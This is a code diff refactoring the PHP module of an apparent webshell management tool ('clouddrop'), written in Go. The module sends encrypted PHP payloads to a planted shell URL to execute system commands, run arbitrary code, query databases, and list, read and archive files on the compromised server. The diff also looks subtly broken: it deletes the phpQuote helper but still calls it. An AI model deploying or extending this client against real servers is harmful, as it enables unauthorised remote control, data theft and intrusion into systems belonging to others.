@@ -4,7 +4,6 @@ import (
 	"clouddrop/pkg/util"
 	"fmt"
 	"log"
-	"os"
 	"strings"
 )
 
@@ -14,106 +13,75 @@ func (s *PHPShell) GetShellType() string {
 	return "php"
 }
 
-func phpQuote(value string) string {
-	value = strings.ReplaceAll(value, "\\", "\\\\")
-	value = strings.ReplaceAll(value, "\"", "\\\"")
-	value = strings.ReplaceAll(value, "\r", "\\r")
-	value = strings.ReplaceAll(value, "\n", "\\n")
-	return "\"" + value + "\""
-}
-
-func (s *PHPShell) FreshSession(id int, url string, password string) (string, error) {
+func (s *PHPShell) FreshSession(id int, shellURL string, password string) (string, error) {
 	if PhpSessions == nil {
-		// first init php shell
 		PhpSessions = make(map[int]string)
 	}
-	password = util.GeneratePasswordSeed()
 
-	// Get the target code and encrypt
-	code, _ := os.ReadFile("./pkg/api/php/Check.php")
-	code = append(code, []byte("\nmain();")...) // add main() to call
-
-	// 加密code
-	enCode := util.Encrypt(string(code), password)
-
-	var err error
-	PhpSessions[id], err = util.PostRequestWithoutSession(url, password, enCode)
+	dynamicPassword := util.GeneratePasswordSeed()
+	code, err := readPayload("php", "Check.php")
 	if err != nil {
 		return "", err
 	}
+	code = payloadWithSuffix(code, "\nmain();")
+	enCode := util.EncryptWithOffset(code, dynamicPassword, util.RequestOffsetForShell(s.GetShellType()))
 
-	session := PhpSessions[id] // if key not exist, it returns "" , bcz type is string
-	log.Println("当前PHPSESSID " + session)
-
-	enResult, err := util.PostRequest(url, password, enCode, session, s.GetShellType())
+	PhpSessions[id], err = util.PostRequestWithoutSession(shellURL, dynamicPassword, enCode)
 	if err != nil {
 		return "", err
 	}
+	log.Println("当前PHP会话 " + PhpSessions[id])
 
-	// 解密code
-	res := util.Decrypt(enResult, password)
-
-	return res, nil
+	enResult, err := util.PostRequest(shellURL, dynamicPassword, enCode, PhpSessions[id], s.GetShellType())
+	if err != nil {
+		return "", err
+	}
+	res, err := util.DecryptWithOffset(strings.TrimSpace(enResult), dynamicPassword, 5)
+	if err != nil {
+		return "", err
+	}
+	return strings.TrimSpace(res), nil
 }
 
-// BaseInfo
-func (s *PHPShell) BaseInfo(id int, url string, password string) (string, error) {
-	// code := `echo getcwd();`
-	code, _ := os.ReadFile("./pkg/api/php/BaseInfo.php")
-	code = fmt.Append(code, "\nmain();") // add main() to call
-
-	res, err := util.HookPost(url, password, string(code), PhpSessions[id], s.GetShellType())
+func (s *PHPShell) BaseInfo(id int, shellURL string, password string) (string, error) {
+	code, err := readPayload("php", "BaseInfo.php")
 	if err != nil {
 		return "", err
 	}
-
-	return res, nil
+	code = payloadWithSuffix(code, "\nmain();")
+	return util.HookPostWithOptions(shellURL, password, code, PhpSessions[id], s.GetShellType(), nil)
 }
 
-// ExecCommand executes a command on the PHP shell and returns the output
-func (s *PHPShell) ExecCommand(id int, command string, url string, password string) (string, error) {
-	// Todo 需要支持自己上传cmd。适用于某些情况c盘下的cmd.exe没有执行权限
-
-	// 1. first need to get the system type
-	code, _ := os.ReadFile("./pkg/api/php/OS.php")
-	code = fmt.Append(code, "\nmain();")
-
-	osType, err := util.HookPost(url, password, string(code), PhpSessions[id], s.GetShellType())
+func (s *PHPShell) ExecCommand(id int, command string, shellURL string, password string) (string, error) {
+	osCode, err := readPayload("php", "OS.php")
+	if err != nil {
+		return "", err
+	}
+	osCode = payloadWithSuffix(osCode, "\nmain();")
+	osType, err := util.HookPostWithOptions(shellURL, password, osCode, PhpSessions[id], s.GetShellType(), nil)
 	if err != nil {
 		return "", err
 	}
 
-	var cmdPath string // in if-block-level scope, it must define at out
-	if osType == "Linux" {
-		cmdPath = "/bin/bash"
-	} else {
-		cmdPath = "C:/Windows/System32/cmd.exe"
-	}
-
-	// 2. base on the osType, execute the command
-	code, _ = os.ReadFile("./pkg/api/php/CMD.php")
-	code = fmt.Appendf(code, "\nmain(%s, \"true\", %s);", phpQuote(cmdPath), phpQuote(command))
-
-	res, err := util.HookPost(url, password, string(code), PhpSessions[id], s.GetShellType())
+	code, err := readPayload("php", "CMD.php")
 	if err != nil {
 		return "", err
 	}
-
-	return res, nil
+	cmdPath := chooseWindowsCmd(osType)
+	code = payloadWithSuffix(code, fmt.Sprintf("\nmain(%s, \"true\", %s);", phpQuote(cmdPath), phpQuote(command)))
+	return util.HookPostWithOptions(shellURL, password, code, PhpSessions[id], s.GetShellType(), nil)
 }
 
-// ExecCode execute user's present shellcode
-func (s *PHPShell) ExecCode(id int, code string, url string, password string) (string, error) {
-	// 这里有个问题，直接自定义代码的话会缺少返回结果的加密过程，如何解决？发送过去的payload必须含有加密过程
+func (s *PHPShell) ExecCode(id int, code string, shellURL string, password string) (string, error) {
 	shellcode := fmt.Sprintf(`
 error_reporting(0);
 session_start();
 $res = main();
 echo encrypt($res, $_SESSION['k']);
 function main() {
-	ob_start(); // 开始输出缓冲
-	%s          // 执行传入的代码
-	return ob_get_clean(); // 获取缓冲区内容并作为返回值
+	ob_start();
+	%s
+	return ob_get_clean();
 }
 function encrypt($data, $key) {
 	for($i=0; $i<strlen($data); $i++) {
@@ -121,72 +89,56 @@ function encrypt($data, $key) {
 	}
 	return base64_encode($data);
 }`, code)
-	res, err := util.HookPost(url, password, shellcode, PhpSessions[id], s.GetShellType())
+	return util.HookPost(shellURL, password, shellcode, PhpSessions[id], s.GetShellType())
+}
+
+func (s *PHPShell) ExecSql(id int, driver, host, port, user, pass, database, sql, option, encoding, shellURL, password string) (string, error) {
+	code, err := readPayload("php", "Database.php")
 	if err != nil {
 		return "", err
 	}
-	return res, nil
-}
-
-func (s *PHPShell) ExecSql(id int, driver, host, port, user, pass, database, sql, option, encoding, url, password string) (string, error) {
-	code, _ := os.ReadFile("./pkg/api/php/Database.php")
-
-	// step 1, database is "", get all dbname
 	if database == "" {
-		code = fmt.Appendf(code,
-			"\nlistDatabases(\"%s\", \"%s\", \"%s\", \"%s\", \"%s\", \"%s\");", driver, host, port, user, pass, encoding)
+		code = payloadWithSuffix(code, fmt.Sprintf("\nlistDatabases(%s, %s, %s, %s, %s, %s);",
+			phpQuote(driver), phpQuote(host), phpQuote(port), phpQuote(user), phpQuote(pass), phpQuote(encoding)))
 	} else {
-		// step 2 , user choses dbname
-		code = fmt.Appendf(code,
-			"\nmain(\"%s\", \"%s\", \"%s\", \"%s\", \"%s\", \"%s\", \"%s\", %s, \"%s\",);", driver, host, port, user, pass, database, sql, option, encoding)
+		code = payloadWithSuffix(code, fmt.Sprintf("\nmain(%s, %s, %s, %s, %s, %s, %s, %s, %s);",
+			phpQuote(driver), phpQuote(host), phpQuote(port), phpQuote(user), phpQuote(pass), phpQuote(database), phpQuote(sql), option, phpQuote(encoding)))
 	}
-
-	res, err := util.HookPost(url, password, string(code), PhpSessions[id], s.GetShellType())
-	if err != nil {
-		return "", err
-	}
-	return res, nil
+	return util.HookPostWithOptions(shellURL, password, code, PhpSessions[id], s.GetShellType(), nil)
 }
 
-func (s *PHPShell) FileZip(id int, srcPath string, toPath string, url string, password string) (string, error) {
-	code, _ := os.ReadFile("./pkg/api/php/FileZip.php")
-	code = fmt.Appendf(code, "\nmain(%s, %s);", phpQuote(srcPath), phpQuote(toPath))
-	res, err := util.HookPost(url, password, string(code), PhpSessions[id], s.GetShellType())
+func (s *PHPShell) FileZip(id int, srcPath string, toPath string, shellURL string, password string) (string, error) {
+	code, err := readPayload("php", "FileZip.php")
 	if err != nil {
 		return "", err
 	}
-	return res, nil
+	code = payloadWithSuffix(code, fmt.Sprintf("\nmain(%s, %s);", phpQuote(srcPath), phpQuote(toPath)))
+	return util.HookPostWithOptions(shellURL, password, code, PhpSessions[id], s.GetShellType(), nil)
 }
 
-func (s *PHPShell) FileUnZip(id int, srcPath string, toPath string, url string, password string) (string, error) {
-	code, _ := os.ReadFile("./pkg/api/php/FileUnZip.php")
-	code = fmt.Appendf(code, "\nmain(%s, %s);", phpQuote(srcPath), phpQuote(toPath))
-	res, err := util.HookPost(url, password, string(code), PhpSessions[id], s.GetShellType())
+func (s *PHPShell) FileUnZip(id int, srcPath string, toPath string, shellURL string, password string) (string, error) {
+	code, err := readPayload("php", "FileUnZip.php")
 	if err != nil {
 		return "", err
 	}
-	return res, nil
+	code = payloadWithSuffix(code, fmt.Sprintf("\nmain(%s, %s);", phpQuote(srcPath), phpQuote(toPath)))
+	return util.HookPostWithOptions(shellURL, password, code, PhpSessions[id], s.GetShellType(), nil)
 }
 
-// FileList lists all files in the current directory
-func (s *PHPShell) FileList(id int, path string, url string, password string) (string, error) {
-	code, _ := os.ReadFile("./pkg/api/php/FileList.php")
-	code = fmt.Appendf(code, "\nmain(%s);", phpQuote(path))
-
-	res, err := util.HookPost(url, password, string(code), PhpSessions[id], s.GetShellType())
+func (s *PHPShell) FileList(id int, path string, shellURL string, password string) (string, error) {
+	code, err := readPayload("php", "FileList.php")
 	if err != nil {
 		return "", err
 	}
-	return res, nil
+	code = payloadWithSuffix(code, fmt.Sprintf("\nmain(%s);", phpQuote(path)))
+	return util.HookPostWithOptions(shellURL, password, code, PhpSessions[id], s.GetShellType(), nil)
 }
 
-func (s *PHPShell) FileShow(id int, path string, url string, password string) (string, error) {
-	code, _ := os.ReadFile("./pkg/api/php/FileShow.php")
-	code = fmt.Appendf(code, "\nmain(%s);", phpQuote(path))
-
-	res, err := util.HookPost(url, password, string(code), PhpSessions[id], s.GetShellType())
+func (s *PHPShell) FileShow(id int, path string, shellURL string, password string) (string, error) {
+	code, err := readPayload("php", "FileShow.php")
 	if err != nil {
 		return "", err
 	}
-	return res, nil
+	code = payloadWithSuffix(code, fmt.Sprintf("\nmain(%s);", phpQuote(path)))
+	return util.HookPostWithOptions(shellURL, password, code, PhpSessions[id], s.GetShellType(), nil)
 }
